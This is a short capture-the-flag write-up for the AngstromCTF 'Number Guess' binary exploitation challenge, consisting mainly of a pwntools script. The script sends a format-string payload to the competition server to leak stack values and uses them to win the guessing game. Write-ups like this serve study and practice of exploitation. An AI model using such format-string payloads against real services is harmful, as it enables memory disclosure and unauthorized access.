# Number Guess

**Category:** Binary Exploitation
**Points:** 70
**Description:**


> Ian loves playing number guessing games, so he went ahead and wrote one himself (source). I hope it doesn't have any vulns. The service is running at nc shell.angstromctf.com 1235.

## Write-up

```python
from pwn import *

# p = process('./guessPublic64')
p = remote('shell.angstromctf.com', 1235)

p.recvuntil("max):")
p.sendline("0x%3$x-0x%9$x")

p.recvuntil("sum?")
data = p.recvuntil("guess:")
numbers = data.split("'s guess")[0].strip().split('-')

p.sendline(str(int(numbers[0],16)+int(numbers[1],16)))

print p.recvall()
```


